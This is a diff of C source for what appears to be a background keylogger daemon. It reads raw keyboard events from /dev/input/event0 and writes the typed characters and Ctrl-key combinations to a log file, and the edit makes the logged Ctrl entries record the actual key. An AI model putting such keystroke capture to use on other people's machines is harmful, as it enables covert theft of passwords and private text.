@@ -106,10 +106,6 @@ int main() {//int argc, char *argv[]) {
     if (access(PID_FILE, F_OK) != -1)  // PID file already exists
         error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
 
-    input_fd = open("/dev/input/event0", O_RDONLY);
-    if (input_fd == -1)
-        error(EXIT_FAILURE, errno, "Error opening input event device '%s'", INPUT_EVENT_DIR);
-
     set_signal_handling();
 
     if (daemon(0, 1) == -1)  // become daemon
@@ -126,8 +122,14 @@ int main() {//int argc, char *argv[]) {
     bool ctrl_active = false;
 
     int repeats = 0;
+    char str[10];
 
     log_message(LOG_FILE, "Setup complete, starting to listen now.");
+
+    input_fd = open("/dev/input/event0", O_RDONLY);
+    if (input_fd == -1)
+        error(EXIT_FAILURE, errno, "Error opening input event device '%s'", INPUT_EVENT_DIR);
+
     
     while(read(input_fd, &event, sizeof(struct input_event)) > 0) {
 
@@ -156,7 +158,8 @@ int main() {//int argc, char *argv[]) {
             if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER || 
                     (ctrl_active && (scan_code == KEY_C || scan_code == KEY_D))) {
                 if (ctrl_active) {
-                    log_message(LOG_FILE, "Ctrl C or D");
+                    sprintf(str, "Ctrl-%c", char_keys[get_char_index(scan_code)]);
+                    log_message(LOG_FILE, str);
                     // Log C or D
                 }
                 // Can't think of any better way to to this for now.
@@ -172,7 +175,6 @@ int main() {//int argc, char *argv[]) {
             if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
                 ctrl_active = true;
                 
-            char str[10];
             if (is_char(scan_code)) {
                 char ch;
                 if (shift_active) {
